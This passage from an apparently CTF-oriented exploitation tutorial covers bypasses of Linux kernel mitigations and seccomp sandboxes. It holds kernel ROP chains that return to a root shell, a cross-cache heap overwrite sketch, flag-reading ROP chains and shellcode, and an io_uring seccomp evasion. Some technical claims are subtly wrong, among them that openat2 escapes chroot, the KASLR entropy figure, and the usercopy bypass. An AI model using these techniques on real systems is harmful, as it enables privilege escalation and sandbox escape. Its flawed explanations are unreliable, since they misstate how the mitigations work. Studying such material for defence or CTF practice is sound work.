Many kernel vulnerabilities leak kernel pointers. Common sources:

- **Uninitialized kernel memory** returned to userspace via `copy_to_user` of a struct that wasn't fully zeroed.
- **Unlinked list entries** where `prev`/`next` pointers aren't cleared.
- **`/proc` filesystem entries** that expose kernel addresses (like `/proc/kallsyms`, `/proc/modules`, `/sys/kernel/notes`).

```c
// Example: uninitialized field in a kernel struct returned to user
struct vulnerable_ioctl_result {
    int status;
    int padding;       // uninitialized — may contain kernel heap pointer
    char data[256];
};

// If this struct is copied to user space without memset(0),
// the padding field may contain a kernel heap address
```

**Bypass 3: Side channels**

- **TSX (Transactional Synchronization Extensions):** Use Intel TSX to probe kernel addresses. A transaction accessing a mapped kernel address succeeds (or aborts gracefully), while accessing an unmapped address causes a different abort behavior.
- **Prefetch side channel:** The `prefetch` instruction timing varies depending on whether an address maps to a cached physical page. By measuring timing, you can determine if a guessed kernel address is valid.

### 6.3 KPTI Bypass

**KPTI** (Kernel Page Table Isolation) separates kernel and user page tables. In user mode, the kernel pages are unmapped (not just NX/SMAP). This means the ret2user technique of jumping to user-space shellcode from kernel context is impossible — the kernel page tables don't map user pages.

**Bypass: Use the KPTI trampoline to switch page tables properly.**

The kernel's `swapgs_restore_regs_and_return_to_usermode` (or similar symbol) handles the transition correctly: it calls `swapgs`, restores registers, and executes `iretq` with the correct page tables.

```python
# Build a kernel ROP chain that ends with the proper return-to-usermode path
# This symbol is at a known offset from kernel_base (after KASLR bypass)

swapgs_iret_path = kernel_base + OFFSET_swapgs_restore_regs_and_return_to_usermode

# The path expects the following on the stack (after the return address):
#   [rcx placeholder]
#   [r11 placeholder]
#   [user_cs]
#   [user_rsp]
#   [user_ss]
# Some variants need an extra 0 on the stack

payload  = p64(pop_rdi)
payload += p64(0)
payload += p64(prepare_kernel_cred)
payload += p64(pop_rdi)          # need: mov rdi, rax somehow...
# ... privilege escalation gadgets ...

# Final: return to user-mode properly
payload += p64(swapgs_iret_path)
payload += p64(0)          # rcx (placeholder)
payload += p64(0)          # r11 (RFLAGS placeholder)
payload += p64(user_cs)    # user-mode CS (0x33 on x86-64)
payload += p64(user_rsp)   # user-mode stack
payload += p64(user_ss)    # user-mode SS (0x2b on x86-64)
```

```c
// User-space saves these before triggering the kernel exploit:
unsigned long user_cs, user_ss, user_rflags, user_rsp;

void save_state() {
    __asm__ volatile(
        "mov %%cs, %0\n"
        "mov %%ss, %1\n"
        "pushfq\n"
        "pop %2\n"
        "mov %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
    );
}

// After returning from kernel, execution continues at shell_function
void shell_function() {
    // We're now root in user-mode!
    system("/bin/sh");
}

// In the ROP chain, the iretq return address points to shell_function
```

### 6.4 Slab Freelist Hardening Bypass

Modern Linux kernels hardened the SLAB allocator with freelist pointer obfuscation:

```c
// In older kernels, freelist pointers were stored as-is:
void *freelist_ptr = next_free_chunk;

// In hardened kernels:
freelist_ptr = next_free_chunk ^ (random_xor ^ &chunk)
// The XOR key includes a random value AND the chunk's own address
```

**Bypass 1: Leak the random XOR value**

If you can read a freelist pointer and know what it should point to (e.g., you know the address of the next chunk from heap layout analysis), you can compute the XOR key:

```python
# known_next = address of the chunk that should be next in freelist
# observed_ptr = the obfuscated freelist pointer we can read
# random_xor = observed_ptr ^ known_next ^ &chunk_address

random_xor = observed_ptr ^ known_next_addr ^ chunk_addr
```

**Bypass 2: Cross-cache attack**

Different object sizes go to different slab caches. Instead of targeting the same cache, overflow from one cache into an adjacent cache where freelist hardening doesn't protect the metadata you need to corrupt.

```c
// Allocate objects in cache A (e.g., msg_msg, 1024 bytes)
// Overflow from cache A into objects in cache B (e.g., tty_struct)
// The tty_struct has function pointers we can overwrite

// Allocate a tty_struct that will be adjacent to our overflowed msg_msg:
int ptmx = open("/dev/ptmx", O_RDWR | O_NOCTTY);

// Overflow msg_msg to corrupt the adjacent tty_struct
// The tty_struct.ops->write function pointer can be replaced
// with a kernel ROP gadget address
```

**Bypass 3: Use userfaultfd or FUSE for double-fetch**

The freelist hardening only protects the `next` pointer. If you can craft a fake free object that the allocator will process, you can set up a malicious object that passes the obfuscation check:

```c
// Allocate and free objects to control the slab layout
// Use userfaultfd to delay the kernel's access to a page
// This creates a race window where you can modify the page
// after the kernel's integrity check but before the actual use

// Setup userfaultfd:
int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
// Register a range for monitoring
// In the fault handler, sleep briefly then resolve the page
// This gives a timing window for TOCTOU attacks
```

### 6.5 CFI/IBT Bypass

**CFI** (Control Flow Integrity) verifies that indirect branches (e.g., `call rax`, `jmp rdx`) only target valid functions. **IBT** (Indirect Branch Tracking) is Intel's CET (Control-flow Enforcement Technology) implementation: `ENDBR64` instructions mark valid branch targets, and the CPU raises `#CP` if an indirect branch lands on a non-`ENDBR` instruction.

**Bypass 1: Find valid ENDBR targets**

Even with IBT, any function starting with `ENDBR64` is a valid target. There are many such targets, and some are useful gadgets:

```bash
# Find ENDBR64 instructions (they are valid indirect branch targets)
objdump -d /lib/x86_64-linux-gnu/libc.so.6 | grep endbr64 | head -20
# endbr64 at system(), endbr64 at malloc(), endbr64 at one_gadget locations...

# These are all valid targets for indirect branches
# One-gadget addresses that start with ENDBR64 still work under IBT
```

**Bypass 2: Direct calls via GOT**

The PLT/GOT mechanism uses indirect branches, but the targets are always `ENDBR64` (they're function prologues). Overwriting a GOT entry (if not full RELRO) still works because the target address must only be a valid `ENDBR` location:

```python
# GOT entries point to functions that start with ENDBR64 in libc
# Overwriting printf@GOT with system (which also starts with ENDBR64)
# passes IBT checks

payload = arbitrary_write(printf_got, libc_base + libc.symbols['system'])
```

**Bypass 3: Return-oriented programming**

IBT only tracks forward edges (calls/jumps), not backward edges (returns). ROP chains consist of `ret` instructions which are backward-edge transfers. IBT does NOT prevent ROP — you need **_shadow stacks** for that (a separate hardware feature). In practice, CFI without shadow stacks doesn't stop ROP.

### 6.6 KASLR Entropy Reduction (RANDOMIZE_BASE Bypass)

On x86-64, kernel text starts at a random offset with ~30 bits of entropy (aligned to 2MB = 21 bits of significant address bits). On 32-bit, it's even less (~8 bits).

**Bypass: Brute force (32-bit) or info leak (64-bit)**

```bash
# 32-bit: kernel base has only ~256 possible positions
for i in $(seq 1 500); do
    # Try each possible offset
    # If we get a kernel OOPS instead of a hard crash, we learn something
    echo $i
done

# 64-bit: must use info leak; brute force is infeasible
```

**Bypass: Fixed-offset attacks**

Even without knowing the exact base, relative offsets within the kernel are constant. If you can reach ANY known function (e.g., via a partial overwrite), you can compute all others:

```python
# Kernel symbols' relative offsets don't change:
# prepare_kernel_cred = kernel_base + FIXED_OFFSET
# commit_creds = kernel_base + ANOTHER_FIXED_OFFSET

# If you know any kernel address, compute base:
kernel_base = known_addr - FIXED_OFFSET_for_that_symbol

# From /boot/config-$(uname -r):
# CONFIG_RANDOMIZE_BASE=y  (KASLR is enabled)
# But the offsets are compile-time constants in the vmlinux
```

### 6.7 Hardened usercopy Bypass

`__check_object_size` and `hardened_usercopy` check that `copy_to_user`/`copy_from_user` don't cross slab object boundaries. This prevents common heap overflow patterns.

**Bypass: Use objects that span multiple pages**

```c
// Objects larger than a page (e.g., msg_msg with a large data size)
// cross page boundaries and the check verifies the full range
// not individual slab objects

// Use sendmsg() with a large ancillary data buffer:
struct msghdr msg = {0};
struct iovec iov;
char cmsg_buf[PAGE_SIZE * 2];

// The msg_msg structure can hold up to ~64KB of data
// spanning multiple pages, passing the usercopy check
// for the entire range

msg.msg_control = cmsg_buf;
msg.msg_controllen = sizeof(cmsg_buf);
sendmsg(sock, &msg, 0);
```

**Bypass: Use page-level objects (not slab)**

```c
// Objects allocated with kmalloc(..., GFP_KERNEL) that exceed
// the slab cache limits are allocated directly from the page allocator.
// Page-level allocations aren't subject to slab usercopy checks.

// E.g., pipe_buffer structures use kcalloc for an array that
// may exceed slab limits at larger pipe capacities
```

---

## 7. Sandbox & Seccomp Bypass

### What Seccomp Prevents

Seccomp-bpf restricts the system calls a process can make. A filter program (BPF) is loaded via `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)` or `seccomp()`. Each syscall is evaluated against the BPF program, which can allow, deny (with `SIGKILL`), or trap (with `SIGSYS`).

Common seccomp profiles (e.g., Docker default, Chrome renderer) allow: `read`, `write`, `exit`, `exit_group`, `rt_sigreturn`, `mmap`, `mprotect`, `brk`, `clone`, `fcntl`, `fstat`, `getpid`, `poll`, `sigaltstack`, `arch_prctl`, etc.

Typically blocked: `execve`, `execveat`, `fork` (sometimes), `ptrace`, `mount`, `chroot`, `keyctl`, etc.

### 7.1 openat2 Bypasses chroot

The `openat2` syscall (Linux 5.6+) has a `RESOLVE_IN_ROOT` flag that resolves paths relative to a directory file descriptor. If you're in a chroot, `openat2` with `RESOLVE_IN_ROOT` can escape:

```c
// Even inside chroot, openat2 with RESOLVE_IN_ROOT resolves
// paths relative to the real root fd, not the chroot root

#include <linux/openat2.h>
#include <sys/syscall.h>

int fd = syscall(SYS_openat2, ATFDCWD, "/flag",
                  &(struct open_how){
                      .flags = O_RDONLY,
                      .resolve = RESOLVE_IN_ROOT,
                  }, sizeof(struct open_how));
```

If `openat2` is allowed by the seccomp filter (many filters don't explicitly block it since it's relatively new), and you have an fd pointing to the real root directory, you can bypass chroot restrictions.

### 7.2 Seccomp Filter Analysis

First, identify what the filter allows and blocks:

```bash
# If /proc/pid/status is readable:
cat /proc/self/status | grep Seccomp
# Seccomp: 2  (2 = SECCOMP_MODE_FILTER)

# Extract the BPF filter:
# (requires root or CAP_SYS_ADMIN)
seccomp-tools dump ./vuln

# Or in Python with pwntools:
from pwn import *
p = process('./vuln')
# After 2-3 interactions, the filter may be printed
```

```python
# Analyze seccomp-bpf programmatically using seccomp-tools
# $ seccomp-tools dump ./vuln

# Typical output:
#  line  CODE  JT   JF   K
#  0000: 0x20 0x00 0x00 0x00000000  # load arch
#  0001: 0x15 0x00 0x01 0xc000003e  # if x86_64
#  0002: 0x35 0x00 0x17 0x40000000  # if < 0x40000000 (syscall nr)
#  ...
#  0010: 0x15 0x00 0x08 0x0000003b  # if execve: KILL
#  0011: 0x15 0x00 0x07 0x00000042  # if execveat: KILL
#  ...
#  ALLOW: read (0), write (1), open (2), openat (257), mmap (9), mprotect (10)
#  DENY:  execve (59), execveat (322)
```

### 7.3 Abusing Allowed Syscalls

The key insight: **you don't need `execve` to get a shell**. You can do everything with `open`, `read`, and `write` (or their `at` variants).

**Strategy: Read the flag and send it over a socket**

```python
from pwn import *

# Seccomp blocks: execve, execveat
# Seccomp allows: open, openat, read, write, sendfile, mmap, mprotect

# ROP chain that does:
# fd = openat(AT_FDCWD, "/flag", O_RDONLY)
# read(fd, buf, 256)
# write(stdout_fd, buf, 256)

AT_FDCWD = -100
O_RDONLY = 0

rop  = p64(pop_rdi) + p64(AT_FDCWD)
rop += p64(pop_rsi) + p64(flag_addr)       # "/flag" string in known memory
rop += p64(pop_rdx) + p64(O_RDONLY)
rop += p64(openat_addr)

# read(fd, buf, 256)
rop += p64(pop_rdi) + p64(3)                # fd returned by openat (probably 3)
rop += p64(pop_rsi) + p64(writable_addr)    # buffer address
rop += p64(pop_rdx) + p64(256)
rop += p64(read_addr)

# write(1, writable_addr, 256)
rop += p64(pop_rdi) + p64(1)                # stdout
rop += p64(pop_rsi) + p64(writable_addr)
rop += p64(pop_rdx) + p64(256)
rop += p64(write_addr)
```

**Strategy: openat over open**

Some seccomp filters block `open` (syscall 2) but allow `openat` (syscall 257) or `openat2`. Always check both:

```python
# If open is blocked but openat is allowed:
# openat(dirfd, pathname, flags)
rop += p64(pop_rdi) + p64(0xFFFFFF9C)  # AT_FDCWD = -100 = 0xFFFFFF9C
rop += p64(pop_rsi) + p64(flag_string_addr)  # "/home/flag.txt"
rop += p64(pop_rdx) + p64(0)             # O_RDONLY
rop += p64(sys_openat)
```

**Strategy: mprotect + shellcode with allowed syscalls**

If `mprotect` is allowed, make memory executable and run custom shellcode that only uses allowed syscalls:

```asm
; shellcode: openat + read + write (no execve)
; x86-64 Linux

; openat(AT_FDCWD, "/flag", O_RDONLY)
mov rax, 257        ; SYS_openat
mov rdi, -100       ; AT_FDCWD
lea rsi, [rel flag]
xor rdx, rdx        ; O_RDONLY
syscall

; read(fd, buf, 0x100)
mov rdi, rax         ; fd from openat
xor rax, rax         ; SYS_read
lea rsi, [rel buf]
mov rdx, 0x100
syscall

; write(1, buf, 0x100)
mov rax, 1           ; SYS_write
mov rdi, 1           ; stdout
lea rsi, [rel buf]
mov rdx, 0x100
syscall

; exit(0)
mov rax, 60
xor rdi, rdi
syscall

flag: .string "/flag"
buf:  .space 0x100
```

```python
from pwn import *

shellcode = asm(shellcode_above, arch='amd64')

# Read the flag via allowed syscalls
payload  = b'A' * offset
payload += p64(jmp_rsp_addr)
payload += shellcode
```

**Strategy: sendfile for zero-copy flag exfiltration**

If `read` is blocked but `openat` and `sendfile` are allowed:

```asm
; openat(AT_FDCWD, "/flag", O_RDONLY)
mov rax, 257
mov rdi, -100
lea rsi, [rel flag]
xor rdx, rdx
syscall

; sendfile(stdout, fd, NULL, 4096)
mov rdi, 1           ; out_fd = stdout
mov rsi, rax          ; in_fd = fd from openat
xor rdx, rdx          ; offset = NULL
mov r10, 4096         ; count
mov rax, 40           ; SYS_sendfile
syscall

flag: .string "/flag"
```

**Strategy: Abusing `ptrace` if allowed**

If `ptrace` is allowed (unusual but possible), you can inject shellcode into a child process:

```c
// If seccomp allows ptrace, we can:
// 1. fork() a child
// 2. ptrace(PTRACE_TRACEME) in child
// 3. ptrace(PTRACE_POKETEXT) to inject code into child
// 4. ptrace(PTRACE_CONT) to execute it
```

**Strategy: Abusing `io_uring` if allowed**

`io_uring` canqueue system calls that bypass seccomp filtering in some kernel versions:

```c
// io_uring can execute syscalls asynchronously
// In some kernel versions, io_uring's SQE_OP_OPENAT and similar
// operations bypass seccomp because they're executed in a kernel thread
// that doesn't have the filter applied

struct io_uring ring;
io_uring_queue_init(32, &ring, 0);

struct io_uring_sqe *sqe = io_uring_get_sqe(&ring);
io_uring_prep_openat(sqe, AT_FDCWD, "/flag", O_RDONLY, 0);
io_uring_submit(&ring);

// Wait for completion
struct io_uring_cqe *cqe;
io_uring_wait_cqe(&ring, &cqe);
int fd = cqe->res;
```

This was patched in kernel 5.11+ but works on older kernels where seccomp filter was not applied to io_uring workers.

---

## Summary: Chaining Bypasses

In practice, you chain multiple bypasses:

```
PIE Binary + Full Protections:
1. Leak PIE base (format string or partial read)          → PIE bypass
2. Leak libc address (ret2plt or GOT read)                → ASLR bypass
3. Brute-force or leak canary (fork server or fmt string)  → Canary bypass
4. Build ROP chain with leaked gadgets                     → NX/DEP bypass
5. Overwrite vtable or hook (bypass full RELRO)            → RELRO bypass

Kernel Exploit:
1. Leak kernel base (/proc/kallsyms or info leak)          → KASLR bypass
2. Build kernel ROP chain                                  → SMEP bypass
3. Use swapgs_iret_path for return to userspace            → KPTI bypass
4. Read flag with openat/read/write (no execve)            → Seccomp bypass
```

Each mitigation raises the bar, but no single mitigation is sufficient. Security requires **defense in depth** — stacking mitigations so that bypassing one still leaves others. The attacker must bypass every mitigation in the chain; the defender only needs the chain to hold at one link.